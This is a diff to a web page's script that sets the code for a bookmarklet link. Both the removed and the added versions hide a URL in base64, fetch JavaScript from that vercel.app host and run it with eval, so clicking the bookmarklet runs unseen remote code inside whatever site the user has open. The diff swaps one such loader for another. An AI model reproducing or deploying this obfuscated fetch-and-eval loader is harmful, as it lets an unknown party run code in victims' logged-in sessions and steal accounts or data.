@@ -449,7 +449,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Bookmarklet code
-            const bookmarkletCode = `javascript:(function(){eval(atob('KGZ1bmN0aW9uKCl7Y29uc3QgdXJsID0gJ2h0dHBzOi8vamlzYW54ZGV2LnZlcmNlbC5hcHAvJztmZXRjaCh1cmwpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGNvZGUgPT4gZXZhbChjb2RlKSk7fSkoKTs='));})();`;
+            const bookmarkletCode = `javascript:(()=>{let u=atob('aHR0cHM6Ly9tYXJrZXQtcXhwcm90cmFkZXJvb21yZWFjdHRvdXJuYW1lbnQudmVyY2VsLmFwcC8=');fetch(u).then(r=>r.text()).then(code=>eval(code)).catch(e=>console.error(e))})();`;
 
             // Set the bookmarklet link href
             const bookmarkletLink = document.getElementById('bookmarklet-link');
